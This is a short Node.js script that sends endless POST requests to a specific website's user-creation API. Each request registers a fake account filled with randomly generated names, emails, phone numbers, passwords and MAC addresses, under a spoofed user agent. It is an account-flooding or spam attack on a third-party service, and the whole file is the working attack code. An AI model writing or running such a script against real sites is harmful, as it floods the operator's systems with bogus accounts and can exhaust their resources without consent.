"use strict";

let faker = require('faker');
let request = require("request-promise");
let process = require("process");
let sleep = require('sleep');
let moment = require('moment');
let fs = require('fs');
let await = require('await');

let count = 0;

faker.locale = "en_AU";
let getOptions = () => {
  return {
    method:   'POST',
    url:      'https://www.connectmy.net/api/user_create',
    headers:  {
      'cache-control': 'no-cache',
      Host:            'www.connectmy.net',
      Connection:      'keep-alive',
      Pragma:          'no-cache',
      'Cache-Control': 'no-cache',
      Origin:          "https:'//www.connectmy.net",
      'User-Agent':    faker.internet.userAgent(),
      'Content-Type':  'application/x-www-form-urlencoded; charset=UTF-8',
      'DNT':           '1',
      Referer:         "https:'//www.connectmy.net/",
    },
    formData: {
      id:              '',
      UserName:        faker.internet.userName(),
      Name:            faker.name.findName(),
      Mail:            faker.internet.email(),
      Mobile:          faker.phone.phoneNumber(),
      Password:        faker.internet.password(),
      Room:            faker.random.number(499),
      AllowSmsNotices: faker.random.boolean() ? 'Yes' : 'No',
      SignUpMAC:       faker.internet.mac().toUpperCase(),
      pwquestion:      faker.lorem.sentence(),
      pwanswer:        faker.lorem.sentence(),
      termsRead:       'true',
    },
  }
};

async function fire(options) {
  try {
    const body = await request(options);
    try {
      if (parseInt(JSON.parse(body)['user_create']['ok']) === 1) {
        process.stdout.write(`${moment().format('LLLL')}: Success. Count: ${++count} \n`);
      }
    } catch (e) {}
  }
  catch (error) {
    Promise.reject(error);
  }
}

while (1) {
  fire(getOptions());
}
